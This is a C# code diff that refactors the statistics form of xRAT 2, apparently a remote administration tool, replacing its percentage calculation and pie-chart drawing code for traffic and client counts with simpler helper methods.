@@ -28,120 +28,105 @@ namespace xRAT_2.Forms
             InitializeComponent();
         }
 
-        private int calculate(long value, long sum)
-        {
-            if (sum != 0)
-                return (int)(((float)value / (float)sum) * 100);
-            else
-                return 0;
-        }
-
-        private int calculate(int value, int sum)
-        {
-            if (sum != 0)
-                return (int)(((float)value / (float)sum) * 100);
-            else
-                return 0;
-        }
-
         private void frmStatistics_Load(object sender, EventArgs e)
         {
-            long sum = BytesReceived + BytesSent;
-            int received = calculate(BytesReceived, sum);
-            int sent = calculate(BytesSent, sum);
-
-            if (received + sent != 100)
-                received += 1;
-
-            if (received + sent != 100)
-                received += 1;
-
-            ReceivedPercent = received;
-            SentPercent = sent;
+            ReceivedPercent = CalculatePercentage(BytesReceived, BytesReceived + BytesSent);
+            SentPercent = CalculatePercentage(BytesSent, BytesReceived + BytesSent);
 
             OfflineClients = AllTimeConnectedClients - ConnectedClients;
             int sumClients = ConnectedClients + AllTimeConnectedClients + OfflineClients;
 
-            ConnectedClientsPercent = calculate(ConnectedClients, sumClients);
-            AllTimePercent = calculate(AllTimeConnectedClients, sumClients);
-            OfflineClientsPercent = calculate(OfflineClients, sumClients);
+            ConnectedClientsPercent = CalculatePercentage(ConnectedClients, sumClients);
+            AllTimePercent = CalculatePercentage(AllTimeConnectedClients, sumClients);
+            OfflineClientsPercent = CalculatePercentage(OfflineClients, sumClients);
         }
 
         private void tabTraffic_Paint(object sender, PaintEventArgs e)
         {
-            if (BytesReceived != 0 && BytesSent != 0)
-            {
-                int[] myPiePercents = { ReceivedPercent, SentPercent };
+            DrawPieChartTraffic(new float[] { BytesReceived, BytesSent });
 
-                Color[] PieColors = { Color.Green, Color.Blue };
+            e.Graphics.DrawLine(new Pen(new SolidBrush(Color.Green), 5), new Point(220, 130), new Point(250, 130));
+            e.Graphics.DrawString(BytesReceived + " Bytes received (" + ReceivedPercent + "%)", this.Font, new SolidBrush(Color.Black), new Point(260, 123));
 
-                Size PieSize = new Size(150, 150);
-
-                if (myPiePercents[0] + myPiePercents[1] != 100)
-                    myPiePercents[0] += 2;
-                else
-                    myPiePercents[0] += 1;
-
-                int sum = 0;
-                foreach (int percent_loopVariable in myPiePercents)
-                    sum += percent_loopVariable;
-
-                int PiePercentTotal = 0;
-                for (int PiePercents = 0; PiePercents < myPiePercents.Length; PiePercents++)
-                {
-                    using (SolidBrush brush = new SolidBrush(PieColors[PiePercents]))
-                    {
-                        e.Graphics.FillPie(brush, new Rectangle(new Point(25, 50), PieSize), Convert.ToSingle(PiePercentTotal * 360 / 100), Convert.ToSingle(myPiePercents[PiePercents] * 360 / 100));
-                    }
-                    PiePercentTotal += myPiePercents[PiePercents];
-                }
-
-                e.Graphics.DrawLine(new Pen(new SolidBrush(Color.Green), 5), new Point(220, 130), new Point(250, 130));
-                e.Graphics.DrawString(BytesReceived + " Bytes received (" + ReceivedPercent + "%)", this.Font, new SolidBrush(Color.Black), new Point(260, 123));
-
-                e.Graphics.DrawLine(new Pen(new SolidBrush(Color.Blue), 5), new Point(220, 160), new Point(250, 160));
-                e.Graphics.DrawString(BytesSent + " Bytes sent (" + SentPercent + "%)", this.Font, new SolidBrush(Color.Black), new Point(260, 153));
-            }
+            e.Graphics.DrawLine(new Pen(new SolidBrush(Color.Blue), 5), new Point(220, 160), new Point(250, 160));
+            e.Graphics.DrawString(BytesSent + " Bytes sent (" + SentPercent + "%)", this.Font, new SolidBrush(Color.Black), new Point(260, 153));
         }
 
         private void tabClients_Paint(object sender, PaintEventArgs e)
         {
-            if (AllTimeConnectedClients != 0)
+            DrawPieChartClients(new float[] { ConnectedClients, AllTimeConnectedClients, OfflineClients });
+
+            e.Graphics.DrawLine(new Pen(new SolidBrush(Color.Green), 5), new Point(220, 130), new Point(250, 130));
+            e.Graphics.DrawString(ConnectedClients + " Connected Clients (" + ConnectedClientsPercent + "%)", this.Font, new SolidBrush(Color.Black), new Point(260, 123));
+
+            e.Graphics.DrawLine(new Pen(new SolidBrush(Color.Blue), 5), new Point(220, 160), new Point(250, 160));
+            e.Graphics.DrawString(AllTimeConnectedClients + " All Time Connected Clients (" + AllTimePercent + "%)", this.Font, new SolidBrush(Color.Black), new Point(260, 153));
+
+            e.Graphics.DrawLine(new Pen(new SolidBrush(Color.Red), 5), new Point(220, 190), new Point(250, 190));
+            e.Graphics.DrawString(OfflineClients + " Offline Clients (" + OfflineClientsPercent + "%)", this.Font, new SolidBrush(Color.Black), new Point(260, 183));
+        }
+
+        private void DrawPieChartTraffic(float [] values)
+        {
+            tabTraffic.Invoke((MethodInvoker)delegate
             {
-                int[] myPiePercents = { ConnectedClientsPercent, AllTimePercent, OfflineClientsPercent };
+                var p = new Pen(Color.Black, 1);
+                var g = tabTraffic.CreateGraphics();
+                var rec = new Rectangle(25, 50, 150, 150);
+                float total = 0;
 
-                Color[] PieColors = { Color.Green, Color.Blue , Color.Red };
+                foreach (var value in values)
+                    total += value;
+                for (int i = 0; i < values.Length; i++)
+                    values[i] = (values[i] / total) * 360;
 
-                Size PieSize = new Size(150, 150);
+                var b1 = new SolidBrush(Color.Green);
+                var b2 = new SolidBrush(Color.Blue);
 
-                if (myPiePercents[0] + myPiePercents[1] != 100)
-                    myPiePercents[0] += 2;
-                else
-                    myPiePercents[0] += 1;
+                g.DrawPie(p, rec, 0, values[0]);
+                g.FillPie(b1, rec, 0, values[0]);
+                g.DrawPie(p, rec, values[0], values[1]);
+                g.FillPie(b2, rec, values[0], values[1]);
 
-                int sum = 0;
-                foreach (int percent_loopVariable in myPiePercents)
-                    sum += percent_loopVariable;
+                b1.Dispose();
+                b2.Dispose();
+            });
+        }
 
-                int PiePercentTotal = 0;
-                for (int PiePercents = 0; PiePercents < myPiePercents.Length; PiePercents++)
-                {
-                    using (SolidBrush brush = new SolidBrush(PieColors[PiePercents]))
-                    {
-                        e.Graphics.FillPie(brush, new Rectangle(new Point(25, 50), PieSize), Convert.ToSingle(PiePercentTotal * 360 / 100), Convert.ToSingle(myPiePercents[PiePercents] * 360 / 100));
-                    }
-                    PiePercentTotal += myPiePercents[PiePercents];
-                }
+        private void DrawPieChartClients(float[] values)
+        {
+            tabClients.Invoke((MethodInvoker)delegate
+            {
+                var p = new Pen(Color.Black, 1);
+                var g = tabClients.CreateGraphics();
+                var rec = new Rectangle(25, 50, 150, 150);
+                float total = 0;
 
-                e.Graphics.DrawLine(new Pen(new SolidBrush(Color.Green), 5), new Point(220, 130), new Point(250, 130));
-                e.Graphics.DrawString(ConnectedClients + " Connected Clients (" + ConnectedClientsPercent + "%)", this.Font, new SolidBrush(Color.Black), new Point(260, 123));
+                foreach (var value in values)
+                    total += value;
+                for (int i = 0; i < values.Length; i++)
+                    values[i] = (values[i] / total) * 360;
 
-                e.Graphics.DrawLine(new Pen(new SolidBrush(Color.Blue), 5), new Point(220, 160), new Point(250, 160));
-                e.Graphics.DrawString(AllTimeConnectedClients + " All Time Connected Clients (" + AllTimePercent + "%)", this.Font, new SolidBrush(Color.Black), new Point(260, 153));
+                var b1 = new SolidBrush(Color.Green);
+                var b2 = new SolidBrush(Color.Blue);
+                var b3 = new SolidBrush(Color.Red);
 
-                e.Graphics.DrawLine(new Pen(new SolidBrush(Color.Red), 5), new Point(220, 190), new Point(250, 190));
-                e.Graphics.DrawString(OfflineClients + " Offline Clients (" + OfflineClientsPercent + "%)", this.Font, new SolidBrush(Color.Black), new Point(260, 183));
-            }
+                g.DrawPie(p, rec, 0, values[0]);
+                g.FillPie(b1, rec, 0, values[0]);
+                g.DrawPie(p, rec, values[0], values[1]);
+                g.FillPie(b2, rec, values[0], values[1]);
+                g.DrawPie(p, rec, values[1] + values[0], values[2]);
+                g.FillPie(b3, rec, values[1] + values[0], values[2]);
+
+                b1.Dispose();
+                b2.Dispose();
+                b3.Dispose();
+            });
+        }
+
+        private int CalculatePercentage(float value, float sum)
+        {
+            return (sum != 0) ? (int)((value / sum) * 100) : 0;
         }
     }
 }
